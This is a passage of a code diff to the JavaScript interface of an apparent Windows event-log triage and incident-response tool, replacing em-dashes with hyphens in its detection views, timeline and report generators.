+       'Click <b>+ Add '+info.label+' log</b> above to import '+(cat==="vpn"?"a VPN":"a firewall")+' log - its events will appear here.</div>';
   } else {
     const CAP=20000; const show=idxs.slice(0,CAP);
     h+='<div class="dtscroll tall"><table class="dt tl"><thead><tr><th>Time</th><th>Source</th><th>Details</th></tr></thead><tbody>';
@@ -5861,7 +5862,7 @@ async function renderCatSectionScroll(cat){
   let h=head; const idxs=c.rows, total=c.total;
   if(!total){
     h+='<div class="cat-empty"><span class="big">'+info.icon+'</span>No '+info.label+' logs added yet.<br>'+
-       'Click <b>+ Add '+info.label+' log</b> above to import '+(cat==="vpn"?"a VPN":"a firewall")+' log — its events will appear here.</div>';
+       'Click <b>+ Add '+info.label+' log</b> above to import '+(cat==="vpn"?"a VPN":"a firewall")+' log - its events will appear here.</div>';
   } else {
     h+='<div class="dtscroll tall"><table class="dt tl"><thead><tr><th>Time</th><th>Source</th><th>Details</th></tr></thead><tbody>';
     for(const x of idxs){ h+='<tr data-idx="'+x.i+'"><td class="mono dim">'+esc(x.ts||"")+'</td>'+
@@ -5913,7 +5914,7 @@ function renderCaseBar(){
     h+='<div class="case-chips">';
     h+='<button class="src-chip'+(srcFilter===null?' on':'')+'" data-src="">All <b>'+total.toLocaleString()+'</b></button>';
     for(const s of src){ const ty=clientLogType(s.name);
-      h+='<button class="src-chip'+(srcFilter===s.name?' on':'')+'" data-src="'+esc(s.name)+'" title="'+esc(s.name)+' — '+(s.count||0).toLocaleString()+' events">'+
+      h+='<button class="src-chip'+(srcFilter===s.name?' on':'')+'" data-src="'+esc(s.name)+'" title="'+esc(s.name)+' - '+(s.count||0).toLocaleString()+' events">'+
         (ty?'<span class="src-type">'+esc(ty)+'</span> ':'')+esc(shortName(stripExt(s.name)))+' <b>'+(s.count||0).toLocaleString()+'</b></button>'; }
     h+='</div>';
   }
@@ -5934,7 +5935,7 @@ async function addLogsToServer(files){
     await loadSessionFromServer(j.meta);
     await restoreFlagsFromServer();
     const added=(j.meta&&j.meta.sources||[]).slice(-files.length).map(s=>s.type+" ("+(s.count||0).toLocaleString()+")").join(", ");
-    setRulesStatus("Added "+files.length+" log"+(files.length>1?"s":"")+": "+esc(added)+" — re-scanning…");
+    setRulesStatus("Added "+files.length+" log"+(files.length>1?"s":"")+": "+esc(added)+" - re-scanning…");
     await runDetections();
   }catch(err){ showProgress(false); alert("Add logs failed: "+(err&&err.message||err)); }
 }
@@ -5943,7 +5944,7 @@ function updateWindowBanner(meta){
   if(!b){ b=document.createElement("div"); b.id="winBanner"; b.className="win-banner";
     const main=document.querySelector("main"); if(main) main.insertBefore(b, main.firstChild); }
   if(SCROLL && meta){ b.style.display="block";
-    b.innerHTML="Streaming all <b>"+(meta.count||0).toLocaleString()+"</b> events in one continuous scroll — "+
+    b.innerHTML="Streaming all <b>"+(meta.count||0).toLocaleString()+"</b> events in one continuous scroll - "+
       "search, sort, Detections, Evidence, Firewall and VPN all run across the <b>full</b> log.";
   }
   else b.style.display="none";
@@ -6050,7 +6051,7 @@ function attackPanel(A){
     const name=slug==="unmapped"?"Other":(TAC_NAMES[slug]||slug);
     h+='<div class="atk-col"><div class="atk-tac">'+esc(name)+' <span class="atk-tn">'+arr.length+'</span></div>';
     for(const t of arr){ const nm=t.name&&t.name!==t.id?t.name:"";
-      h+='<div class="atk-tech" data-tech="'+esc(t.id)+'" title="'+esc(t.id+(nm?" — "+nm:"")+" · "+t.count+" events · click to filter")+'" style="border-left:3px solid '+numColor(sevNum(t.level))+'">'+
+      h+='<div class="atk-tech" data-tech="'+esc(t.id)+'" title="'+esc(t.id+(nm?" - "+nm:"")+" · "+t.count+" events · click to filter")+'" style="border-left:3px solid '+numColor(sevNum(t.level))+'">'+
         '<div class="atk-id">'+esc(t.id)+'</div>'+(nm?'<div class="atk-nm">'+esc(nm)+'</div>':'')+'<span class="atk-c">'+t.count.toLocaleString()+'</span></div>'; }
     h+='</div>';
   }
@@ -6076,8 +6077,8 @@ function exportNavigator(A){
   if(!A||!A.techniques||!A.techniques.length){ alert("No ATT&CK techniques to export."); return; }
   const maxScore=Math.max(1,...A.techniques.map(t=>t.count));
   const techniques=A.techniques.map(t=>({ techniqueID:t.id, score:t.count, color:navColor(t.level),
-    comment:(t.name&&t.name!==t.id?t.name+" — ":"")+t.count+" events; rules: "+(t.rules||[]).slice(0,8).join(", "), enabled:true }));
-  const layer={ name:"EVTX Triage — "+(window.__caseId||"case"), versions:{attack:"14",navigator:"4.9.1",layer:"4.5"},
+    comment:(t.name&&t.name!==t.id?t.name+" - ":"")+t.count+" events; rules: "+(t.rules||[]).slice(0,8).join(", "), enabled:true }));
+  const layer={ name:"EVTX Triage - "+(window.__caseId||"case"), versions:{attack:"14",navigator:"4.9.1",layer:"4.5"},
     domain:"enterprise-attack", description:"Auto-generated from EVTX Triage detections ("+A.techniqueCount+" techniques across "+A.tacticCount+" tactics).",
     techniques, gradient:{colors:["#8ec843","#ffe766","#ff6b6b"],minValue:0,maxValue:maxScore},
     sorting:0, hideDisabled:false, showTacticRowBackground:true, tacticRowBackground:"#205b8f",
@@ -6105,7 +6106,7 @@ function fmtSpan(a,b){ if(!a&&!b)return "?"; if(!b||b===a)return fmtTime(a);
 function chainsPanel(chains){
   if(!chains||!chains.length) return "";
   let h='<div class="panel"><h3>Attack chains <span class="pill">'+chains.length+'</span></h3>'+
-    '<div class="dash-note" style="margin:0 0 8px">Detections grouped per host into time-bounded bursts that progress across ATT&amp;CK tactics — the story, not just the alerts. Click a step to open its event.</div>';
+    '<div class="dash-note" style="margin:0 0 8px">Detections grouped per host into time-bounded bursts that progress across ATT&amp;CK tactics - the story, not just the alerts. Click a step to open its event.</div>';
   for(const c of chains){
     h+='<details class="chain"><summary>'+
       '<span class="sev" style="background:'+numColor(sevNum(c.level))+'"></span>'+
@@ -6135,7 +6136,7 @@ function computeEntitiesFromDetections(){
 }
 const ENT_ICON={user:"👤",host:"🖥️",ip:"🌐"};
 const ENT_TNAME={user:"user",host:"host",ip:"IP address"};
-function entTime(s){ return s?String(s).slice(0,19).replace("T"," "):"—"; }
+function entTime(s){ return s?String(s).slice(0,19).replace("T"," "):"-"; }
 // ---- Entity profile drawer (server mode) ----
 function openEntityProfile(type,name){
   let ov=$("entOv");
@@ -6242,7 +6243,7 @@ const TL_KIND={ detection:{label:"detection",c:"#ff6b6b"}, "anti-forensics":{lab
   rdp:{label:"RDP",c:"#9ecbff"}, firewall:{label:"firewall",c:"#c792ea"}, vpn:{label:"VPN",c:"#79d3c0"} };
 function renderTimeline(){
   const w=$("tlWrap");
-  if(!SERVER){ w.innerHTML='<div class="dash-note">The super-timeline is served by the EVTX Triage backend — open this case through the server to use it.</div>'; return; }
+  if(!SERVER){ w.innerHTML='<div class="dash-note">The super-timeline is served by the EVTX Triage backend - open this case through the server to use it.</div>'; return; }
   if(tlData && tlCase===window.__caseId){ paintTimeline(); return; }
   w.innerHTML='<div class="dash-note">Building the super-timeline across the full log…</div>';
   api("/api/timeline").then(r=>r.json()).then(j=>{ tlData=j; tlCase=window.__caseId;
@@ -6276,7 +6277,7 @@ function paintFeed(){
       '<span class="ddot" style="background:'+numColor(sevNum(e.level))+'"></span>'+
       '<span class="tl-host mono">'+esc(e.host||"")+'</span>'+
       '<span class="tl-title">'+esc(e.title||"")+'</span></div>'; }
-  if(feed.length>SHOW) h+='<div class="dash-note">Showing first '+SHOW.toLocaleString()+' of '+feed.length.toLocaleString()+' — narrow with filters or a time window.</div>';
+  if(feed.length>SHOW) h+='<div class="dash-note">Showing first '+SHOW.toLocaleString()+' of '+feed.length.toLocaleString()+' - narrow with filters or a time window.</div>';
   fc.innerHTML=h;
 }
 function paintTimeline(){
@@ -6287,9 +6288,9 @@ function paintTimeline(){
     const hh=b.n>0?Math.max(3,Math.sqrt(b.n)/Math.sqrt(maxN)*100):0;
     const sel=(tlFilters.fromIdx!=null&&k>=tlFilters.fromIdx&&k<=tlFilters.toIdx);
     const col=b.d>0?numColor(b.lvl<0?0:b.lvl):"var(--line-2)";
-    bars+='<div class="tlb'+(sel?" sel":"")+'" data-b="'+k+'" title="'+esc(fmtTime(b.t))+' — '+b.n.toLocaleString()+' events'+(b.d?' · '+b.d.toLocaleString()+' notable':'')+'" style="height:'+hh.toFixed(1)+'%;background:'+col+'"></div>'; }
+    bars+='<div class="tlb'+(sel?" sel":"")+'" data-b="'+k+'" title="'+esc(fmtTime(b.t))+' - '+b.n.toLocaleString()+' events'+(b.d?' · '+b.d.toLocaleString()+' notable':'')+'" style="height:'+hh.toFixed(1)+'%;background:'+col+'"></div>'; }
   const win=tlWindow();
-  let h='<div class="dash-note">Merged notable timeline — <b>'+j.notableTotal.toLocaleString()+'</b> notable events ('+j.detTotal.toLocaleString()+' detections'+(j.truncated?'; feed shows the highest-signal 12,000':'')+') across the whole case. Click the histogram to zoom a window.</div>';
+  let h='<div class="dash-note">Merged notable timeline - <b>'+j.notableTotal.toLocaleString()+'</b> notable events ('+j.detTotal.toLocaleString()+' detections'+(j.truncated?'; feed shows the highest-signal 12,000':'')+') across the whole case. Click the histogram to zoom a window.</div>';
   h+='<div class="tl-hist">'+bars+'</div>';
   h+='<div class="tl-ax"><span>'+esc(fmtTime(t0))+'</span>'+
      (win?'<span class="tl-win">'+esc(fmtTime(win.from))+' → '+esc(fmtTime(win.to))+' <button class="tl-clear" data-tlclear>✕</button> <button class="chain-focus" data-tlgrid>view in grid ›</button></span>':'')+
@@ -6324,7 +6325,7 @@ $("tlWrap").addEventListener("click",e=>{
 /* ===================== ONE-CLICK IR REPORT ===================== */
 function repEsc(s){ return String(s==null?"":s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c])); }
 function repCard(n,l){ return '<span class="card"><span class="n">'+n+'</span><br><span class="l">'+repEsc(l)+'</span></span>'; }
-// Shared report model — computed once, rendered to HTML/PDF and DOCX identically
+// Shared report model - computed once, rendered to HTML/PDF and DOCX identically
 function reportData(S, dash, ev, meta){
   const sm=S.summary||{}, bySev=S.bySev||{}, A=S.attack||{};
   const caseId=window.__caseId||"local";
@@ -6336,7 +6337,7 @@ function reportData(S, dash, ev, meta){
   const crit=bySev.critical||0, high=bySev.high||0, med=bySev.medium||0, low=(bySev.low||0)+(bySev.info||0);
   const ips=ev&&ev.ips?[...ev.ips.entries()].sort((a,b)=>b[1]-a[1]):[];
   const hashes=ev&&ev.hashes?[...ev.hashes]:[]; const domains=ev&&ev.domains?[...ev.domains]:[];
-  const sources=(dash&&dash.providers)?dash.providers.length+" providers":((caseSources&&caseSources.length)?caseSources.length+" source log(s)":"—");
+  const sources=(dash&&dash.providers)?dash.providers.length+" providers":((caseSources&&caseSources.length)?caseSources.length+" source log(s)":"-");
   const posture = crit? "CRITICAL" : high? "HIGH" : med? "ELEVATED" : (sm.withDetections?"GUARDED":"LOW");
   const topChain=chains[0], topEnt=entities.find(e=>e.type!=="host")||entities[0];
   let exec="During the analysis window ("+span+"), "+totalEvents.toLocaleString()+" event"+(totalEvents===1?"":"s")+" from "+hosts+" host"+(hosts===1?"":"s")+
@@ -6350,14 +6351,14 @@ function reportData(S, dash, ev, meta){
   const cnt=a=>a?a.length:0; const rec=[];
   rec.push("Validate the critical/high-severity detections (Section 6) against the underlying events and classify each as true or false positive before acting.");
   if(ev){
-    if(cnt(ev.logCleared)) rec.push("Event logs were cleared ("+cnt(ev.logCleared)+" occurrence"+(cnt(ev.logCleared)===1?"":"s")+") — treat as anti-forensic activity: immediately preserve all remaining logs and acquire forensic images before further changes.");
-    if(cnt(ev.lsassAccess)) rec.push("LSASS memory access consistent with credential theft was observed — assume credentials on affected hosts are compromised; reset affected account passwords (and the krbtgt account twice if a Domain Controller is involved) and invalidate active sessions/Kerberos tickets.");
-    if(ev.extLogons&&ev.extLogons.size) rec.push("External / RDP logons were detected — review remote-access exposure, restrict RDP to VPN or jump hosts, and enforce multi-factor authentication.");
-    if(cnt(ev.accountsCreated)||cnt(ev.groupAdds)) rec.push("Account creation and/or privileged-group changes were observed — audit and remove any unauthorised accounts and group memberships, and review delegation/admin rights.");
-    if(cnt(ev.services)) rec.push("New services were installed — verify each against a known-good baseline and remove any that are unauthorised (a common persistence mechanism).");
+    if(cnt(ev.logCleared)) rec.push("Event logs were cleared ("+cnt(ev.logCleared)+" occurrence"+(cnt(ev.logCleared)===1?"":"s")+") - treat as anti-forensic activity: immediately preserve all remaining logs and acquire forensic images before further changes.");
+    if(cnt(ev.lsassAccess)) rec.push("LSASS memory access consistent with credential theft was observed - assume credentials on affected hosts are compromised; reset affected account passwords (and the krbtgt account twice if a Domain Controller is involved) and invalidate active sessions/Kerberos tickets.");
+    if(ev.extLogons&&ev.extLogons.size) rec.push("External / RDP logons were detected - review remote-access exposure, restrict RDP to VPN or jump hosts, and enforce multi-factor authentication.");
+    if(cnt(ev.accountsCreated)||cnt(ev.groupAdds)) rec.push("Account creation and/or privileged-group changes were observed - audit and remove any unauthorised accounts and group memberships, and review delegation/admin rights.");
+    if(cnt(ev.services)) rec.push("New services were installed - verify each against a known-good baseline and remove any that are unauthorised (a common persistence mechanism).");
   }
   rec.push("Contain affected hosts (network isolation), preserve volatile data, and eradicate identified persistence mechanisms before restoring systems from a known-good state; then monitor closely for recurrence.");
-  rec.push("This report is an automated triage aid — corroborate all findings with full forensic analysis before reaching conclusions or taking irreversible action.");
+  rec.push("This report is an automated triage aid - corroborate all findings with full forensic analysis before reaching conclusions or taking irreversible action.");
   const cw=casework||{ summary:"", findings:[], annotations:{} };
   const cwAnns=Object.entries(cw.annotations||{}).map(([idx,a])=>({ idx:+idx, ...a }));
   const vcount={}; for(const a of cwAnns){ if(a.verdict) vcount[a.verdict]=(vcount[a.verdict]||0)+1; }
@@ -6383,7 +6384,7 @@ function buildReportHTML(S, dash, ev, meta){
     ".rp ul.rec{margin:8px 0;padding-left:18px}.rp ul.rec li{margin:6px 0}.rp code{background:#f2f4f7;padding:1px 4px;border-radius:3px;font-size:11px;word-break:break-all}"+
     ".rp .foot{margin-top:34px;border-top:1px solid var(--line);padding-top:8px;color:var(--muted);font-size:10px}"+
     "@media print{@page{margin:15mm 13mm}.rp{padding:0;max-width:none}}";
-  let h='<!doctype html><html><head><meta charset="utf-8"><title>Incident Response Report — '+repEsc(d.caseId)+'</title><style>'+css+'</style></head><body><div class="rp">';
+  let h='<!doctype html><html><head><meta charset="utf-8"><title>Incident Response Report - '+repEsc(d.caseId)+'</title><style>'+css+'</style></head><body><div class="rp">';
   // cover
   h+='<div class="cover"><div class="kick">Incident Response · Digital Forensics</div>'+
      '<h1>Windows Event Log Triage Report</h1>'+
@@ -6408,7 +6409,7 @@ function buildReportHTML(S, dash, ev, meta){
         d.cw.findings.map(f=>'<tr><td>'+svpill(f.severity)+'</td><td><b>'+repEsc(f.title)+'</b>'+(f.note?'<br><span class="muted">'+repEsc(f.note).replace(/\n/g,"<br>")+'</span>':'')+'</td></tr>').join("")+'</table>';
     if(d.cwAnns.length){
       const vsum=Object.keys(d.vcount).map(k=>(VERDICT_LABELS[k]||k)+": "+d.vcount[k]).join(" · ");
-      h+='<p class="muted">Event verdicts recorded — '+repEsc(vsum||(d.cwAnns.length+" annotated"))+'.</p>';
+      h+='<p class="muted">Event verdicts recorded - '+repEsc(vsum||(d.cwAnns.length+" annotated"))+'.</p>';
       const notable=d.cwAnns.filter(a=>a.verdict==="tp"||a.verdict==="suspicious").slice(0,40);
       if(notable.length) h+='<table><tr><th style="width:110px">Verdict</th><th style="width:70px">Event #</th><th>Tags</th><th>Analyst note</th></tr>'+
         notable.map(a=>'<tr><td>'+repEsc(VERDICT_LABELS[a.verdict]||a.verdict)+'</td><td>'+a.idx+'</td><td>'+repEsc((a.tags||[]).join(", "))+'</td><td>'+repEsc(a.note||"")+'</td></tr>').join("")+'</table>';
@@ -6445,7 +6446,7 @@ function buildReportHTML(S, dash, ev, meta){
     if(d.hashes.length) h+='<h3>File hashes ('+d.hashes.length+')</h3><p class="muted" style="word-break:break-all">'+d.hashes.slice(0,50).map(repEsc).join('<br>')+'</p>'; }
   // 9. recommendations
   h+=sec("Recommendations")+'<ul class="rec">'+d.rec.map(r=>'<li>'+repEsc(r)+'</li>').join('')+'</ul>';
-  h+='<div class="foot">Generated by EVTX Triage · automated triage aid · findings are heuristic and rule-based and require analyst validation. CONFIDENTIAL — handle per your organisation\'s data-classification policy.</div>';
+  h+='<div class="foot">Generated by EVTX Triage · automated triage aid · findings are heuristic and rule-based and require analyst validation. CONFIDENTIAL - handle per your organisation\'s data-classification policy.</div>';
   return h+'</div></body></html>';
 }
 /* ---- DOCX export: store-only ZIP + WordprocessingML (no libraries) ---- */
@@ -6478,7 +6479,7 @@ function wps(text,style){ return '<w:p><w:pPr><w:pStyle w:val="'+style+'"/></w:p
 function buildReportDocx(S, dash, ev, meta){
   const d=reportData(S,dash,ev,meta), A=d.A; const c=d.cnt;
   let sn=0; const H1=t=>wps((++sn)+".  "+t,"Heading1");
-  let b=wps("Windows Event Log Triage Report","Title")+wps("Incident Response · Digital Forensics — CONFIDENTIAL","Subtitle");
+  let b=wps("Windows Event Log Triage Report","Title")+wps("Incident Response · Digital Forensics - CONFIDENTIAL","Subtitle");
   b+=wtable(["Field","Value"],[["Case reference",d.caseId],["Report generated",d.generated],["Analysis window",d.span],["Scope",d.totalEvents.toLocaleString()+" events · "+d.hosts+" host(s) · "+d.sources],["Assessed posture",d.posture],["Prepared by","EVTX Triage (automated analysis)"]]);
   b+=H1("Executive Summary")+wp(d.exec,{})+
      wtable(["Metric","Value"],[["Events analysed",d.totalEvents.toLocaleString()],["Flagged events",(d.sm.withDetections||0).toLocaleString()],["Total detections",(d.sm.total||0).toLocaleString()],["Critical + high",(d.bySev.crit+d.bySev.high).toLocaleString()],["ATT&CK techniques",String(A.techniqueCount||0)],["Attack chains",String(d.chains.length)]]);
@@ -6488,7 +6489,7 @@ function buildReportDocx(S, dash, ev, meta){
     if(d.cw.findings&&d.cw.findings.length){ b+=wp("Key findings:",{b:true});
       for(const f of d.cw.findings) b+=wp("["+f.severity.toUpperCase()+"]  "+f.title,{b:true})+(f.note?wp(f.note,{gray:true,sz:18}):""); }
     if(d.cwAnns.length){ const vsum=Object.keys(d.vcount).map(k=>(VERDICT_LABELS[k]||k)+": "+d.vcount[k]).join(" · ");
-      b+=wp("Event verdicts recorded — "+(vsum||(d.cwAnns.length+" annotated"))+".",{gray:true,sz:18});
+      b+=wp("Event verdicts recorded - "+(vsum||(d.cwAnns.length+" annotated"))+".",{gray:true,sz:18});
       const notable=d.cwAnns.filter(a=>a.verdict==="tp"||a.verdict==="suspicious").slice(0,40);
       if(notable.length) b+=wtable(["Verdict","Event #","Tags","Note"], notable.map(a=>[VERDICT_LABELS[a.verdict]||a.verdict, String(a.idx), (a.tags||[]).join(", "), a.note||""])); }
   }
@@ -6504,7 +6505,7 @@ function buildReportDocx(S, dash, ev, meta){
     if(d.domains.length) b+=wp("Domains ("+d.domains.length+")",{b:true})+wp(d.domains.slice(0,60).join("   "),{sz:16});
     if(d.hashes.length) b+=wp("File hashes ("+d.hashes.length+")",{b:true})+wp(d.hashes.slice(0,50).join("\n"),{sz:14}); }
   b+=H1("Recommendations"); for(const r of d.rec) b+=wp("•  "+r,{});
-  b+=wp("Generated by EVTX Triage — automated triage aid; findings are heuristic and rule-based and require analyst validation. CONFIDENTIAL — handle per your organisation's data-classification policy.",{gray:true,sz:16});
+  b+=wp("Generated by EVTX Triage - automated triage aid; findings are heuristic and rule-based and require analyst validation. CONFIDENTIAL - handle per your organisation's data-classification policy.",{gray:true,sz:16});
   const doc='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>'+b+'<w:sectPr><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1080" w:right="1080" w:bottom="1080" w:left="1080"/></w:sectPr></w:body></w:document>';
   const styles='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:docDefaults><w:rPrDefault><w:rPr><w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/><w:sz w:val="21"/><w:szCs w:val="21"/></w:rPr></w:rPrDefault></w:docDefaults>'+
     '<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/><w:pPr><w:spacing w:after="80" w:line="264" w:lineRule="auto"/></w:pPr></w:style>'+
@@ -6519,7 +6520,7 @@ function buildReportDocx(S, dash, ev, meta){
 }
 function dlBlob(blob,name){ const a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download=name; a.click(); setTimeout(()=>URL.revokeObjectURL(a.href),5000); }
 function reportBtns(){ return '<div style="display:flex;gap:8px;justify-content:flex-end;margin:-2px 0 10px">'+
-  '<button class="btn" onclick="aiSupport(\'dash\')" title="AI Support — what happened in this case">✦ AI Support</button>'+
+  '<button class="btn" onclick="aiSupport(\'dash\')" title="AI Support - what happened in this case">✦ AI Support</button>'+
   '<button class="btn" onclick="generateIRReport(\'pdf\',this)">📄 PDF report</button>'+
   '<button class="btn" onclick="generateIRReport(\'docx\',this)">📝 Word (DOCX)</button></div>'; }
 /* Flatten the rich client report model into the plain-JSON payload the server renderer
@@ -6560,7 +6561,7 @@ function buildServerReport(S, dash, ev, meta, opts){
     },
     bySev: d.bySev,
     engineLine: (d.sm.sigma!=null||d.sm.correlation!=null||d.sm.yara!=null)
-      ? ("Rule engines — Sigma: "+(d.sm.sigma||0)+" · Correlation: "+(d.sm.correlation||0)+" · YARA: "+(d.sm.yara||0)) : "",
+      ? ("Rule engines - Sigma: "+(d.sm.sigma||0)+" · Correlation: "+(d.sm.correlation||0)+" · YARA: "+(d.sm.yara||0)) : "",
     attack:{
       tacticsLine: (A.tactics||[]).map(t=>t.name+" ("+t.techniques+")").join(" · "),
       techniques: (A.techniques||[]).slice(0,30).map(t=>({id:t.id,name:t.name,count:t.count})),
@@ -6602,7 +6603,7 @@ async function generateIRReport(fmt, btn){
       attack:clientAttack||computeAttackFromDetections(), chains:clientChains||computeChainsFromDetections(),
       entities:clientEntities||computeEntitiesFromDetections(), byRule:[] };
     const base="IR-report-"+(window.__caseId||"case");
-    // Server-rendered real PDF / DOCX (pdfkit + docx) — direct download, no print dialog.
+    // Server-rendered real PDF / DOCX (pdfkit + docx) - direct download, no print dialog.
     if((fmt==="pdf"||fmt==="docx") && SERVER){
       const payload=buildServerReport(S, dash, ev, window.__meta, {});
       const r=await fetch("/api/report."+fmt, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) });
@@ -6629,7 +6630,7 @@ function renderDetectionsServer(){
   let h='<div class="dash-note">Server scanned <b>'+(sm.scanned||0).toLocaleString()+'</b>'+
     (sm.truncated?(' of '+(sm.fullCount||0).toLocaleString()):'')+' events · <b>'+(sm.withDetections||0).toLocaleString()+
     '</b> with detections · <b>'+(sm.total||0).toLocaleString()+'</b> total hits'+
-    (sm.truncated?' · <span class="warn-text">scan capped — raise EVTX_DETECT_CAP for the full log</span>':'')+'</div>';
+    (sm.truncated?' · <span class="warn-text">scan capped - raise EVTX_DETECT_CAP for the full log</span>':'')+'</div>';
   h+='<div class="cards">'+
     statCard((bySev.critical||0).toLocaleString(),"critical",bySev.critical?"bad":"")+
     statCard((bySev.high||0).toLocaleString(),"high",bySev.high?"bad":"")+
@@ -6644,7 +6645,7 @@ function renderDetectionsServer(){
   h+=attackPanel(S.attack);
   h+=entitiesPanel(S.entities);
   if(suppressedRules.length){
-    h+='<div class="panel sup-panel"><h3>Suppressed rules ('+suppressedRules.length+') <span class="pill">hidden from all detections — restore re-scans</span></h3><div class="dtscroll"><table class="dt"><tbody>';
+    h+='<div class="panel sup-panel"><h3>Suppressed rules ('+suppressedRules.length+') <span class="pill">hidden from all detections - restore re-scans</span></h3><div class="dtscroll"><table class="dt"><tbody>';
     for(const rid of suppressedRules) h+='<tr><td class="mono dim">'+esc(rid)+'</td>'+
       '<td style="text-align:right"><button class="rsup" data-unsuppress="'+esc(rid)+'" title="Restore this rule (triggers a re-scan)">restore</button></td></tr>';
     h+='</tbody></table></div></div>';
@@ -6654,7 +6655,7 @@ function renderDetectionsServer(){
   h+='<div class="panel"><h3>Detections by rule ('+groups.length+')</h3><div class="dtscroll"><table class="dt"><thead><tr><th>Lvl</th><th>Rule</th><th>Src</th><th style="text-align:right">Events</th></tr></thead><tbody>';
   for(const g of groups){ h+='<tr data-rule="'+esc(g.ruleId)+'" data-label="'+esc(g.title)+'">'+
     '<td><span class="sev" style="background:'+numColor(sevNum(g.level))+'"></span></td>'+
-    '<td>'+esc(g.title)+'<button class="rsup" data-suppress="'+esc(g.ruleId)+'" title="Suppress this rule — hide its detections everywhere (persists)">🚫 suppress</button></td>'+
+    '<td>'+esc(g.title)+'<button class="rsup" data-suppress="'+esc(g.ruleId)+'" title="Suppress this rule - hide its detections everywhere (persists)">🚫 suppress</button></td>'+
     '<td><span class="src-badge '+esc(g.source)+'">'+esc(String(g.source)[0].toUpperCase())+'</span></td><td class="cnt">'+g.count.toLocaleString()+'</td></tr>'; }
   h+='</tbody></table></div></div>';
   h+='<div class="panel"><h3>Top computers</h3><table class="dt"><tbody>';
@@ -6764,7 +6765,7 @@ function ptHL(s,q){ const es=esc(s||""); if(!q)return es; const eq=esc(q); const
 function ptDesc(n){ let c=0; for(const k of (n.children||[])) c+=1+ptDesc(k); n._desc=c; return c; }
 async function renderProcTree(){
   const w=$("procWrap");
-  if(!SERVER){ w.innerHTML=ptNote("Process trees are reconstructed server-side from Sysmon events — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("Process trees are reconstructed server-side from Sysmon events - run the backend to use this view."); return; }
   w.innerHTML=ptNote("Reconstructing process trees…");
   try{
     const j=await (await api("/api/proctree")).json();
@@ -6847,7 +6848,7 @@ $("procWrap").addEventListener("click",e=>{
 let sessData=null; let sessSort={ key:"onTms", dir:-1 }; let sessState={ q:"", rdp:false, ext:false };
 async function renderSessions(){
   const w=$("sessWrap");
-  if(!SERVER){ w.innerHTML=ptNote("Logon-session reconstruction runs server-side — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("Logon-session reconstruction runs server-side - run the backend to use this view."); return; }
   w.innerHTML=ptNote("Reconstructing logon sessions…");
   try{
     const j=await (await api("/api/sessions")).json();
@@ -6881,7 +6882,7 @@ function paintSessions(){
     th("user","User")+th("ltName","Logon type")+th("ip","Source")+th("host","Host")+
     th("onTms","Start")+th("durationMs","Duration")+th("det","")+'</tr></thead><tbody>';
   for(const s of list){
-    const src = s.ip || s.ws || "—";
+    const src = s.ip || s.ws || "-";
     const tags = (s.rdp?'<span class="stag rdp">RDP</span> ':'')+(s.ext?'<span class="stag ext">EXT</span> ':'')+
       (!s.rdp&&s.lt==="3"?'<span class="stag net">NET</span> ':'');
     const dur = s.offTms!=null ? '<span class="sess-closed">'+esc(fmtDur(s.durationMs))+'</span>'
@@ -6890,7 +6891,7 @@ function paintSessions(){
       '<td>'+esc(s.user)+(s.domain?' <span class="ptpid">'+esc(s.domain)+'</span>':'')+'</td>'+
       '<td>'+esc(s.ltName)+' '+tags+'</td>'+
       '<td class="mono">'+esc(src)+'</td>'+
-      '<td class="mono">'+esc(s.host||"—")+'</td>'+
+      '<td class="mono">'+esc(s.host||"-")+'</td>'+
       '<td class="mono">'+esc(s.onTs||"")+'</td>'+
       '<td>'+dur+'</td>'+
       '<td>'+(s.det?'<span class="ptdet" style="display:inline-block;background:'+numColor(s.det)+'"></span>':'')+'</td>'+
@@ -6919,7 +6920,7 @@ let latData=null, latState={ detonly:false, seed:1 };
 function latDominantKind(kinds){ let best="", n=-1; for(const k in kinds){ if(kinds[k]>n){ n=kinds[k]; best=k; } } return best; }
 async function renderLateral(){
   const w=$("latWrap");
-  if(!SERVER){ w.innerHTML=ptNote("The lateral-movement graph is built server-side — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("The lateral-movement graph is built server-side - run the backend to use this view."); return; }
   w.innerHTML=ptNote("Building lateral-movement graph…");
   try{
     const j=await (await api("/api/lateral")).json();
@@ -7096,7 +7097,7 @@ function wlModeBar(){
 }
 async function renderWatchlist(){
   const w=$("wlWrap");
-  if(!SERVER){ w.innerHTML=ptNote("The Watchlist runs server-side — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("The Watchlist runs server-side - run the backend to use this view."); return; }
   if(wlSettings===null){ try{ wlSettings=await (await api("/api/settings")).json(); }catch{ wlSettings={}; } }
   if(wlMode==="observed"){
     if(wlObserved===null){ w.innerHTML=wlModeBar()+ptNote("Extracting the IPs, hashes and domains present in this case…");
@@ -7111,7 +7112,7 @@ async function renderWatchlist(){
 }
 /* ---- Observed indicators (auto-carved IPs / hashes / domains + reputation) ---- */
 function verdictBadge(j){
-  if(!j) return '<span class="edim" style="font-size:10.5px">—</span>';
+  if(!j) return '<span class="edim" style="font-size:10.5px">-</span>';
   if(!j.ok) return '<span class="edim" style="font-size:10px" title="'+esc(j.error||"")+'">n/a</span>';
   let mal=0, susp=0, abuse=null, checked=false;
   for(const r of (j.results||[])){
@@ -7171,8 +7172,8 @@ function paintObserved(){
   }
   const capped=(wlObsType==="ip"&&o.capped&&o.capped.ips)||(wlObsType==="hash"&&o.capped&&o.capped.hashes)||(wlObsType==="domain"&&o.capped&&o.capped.domains);
   const table=list.length
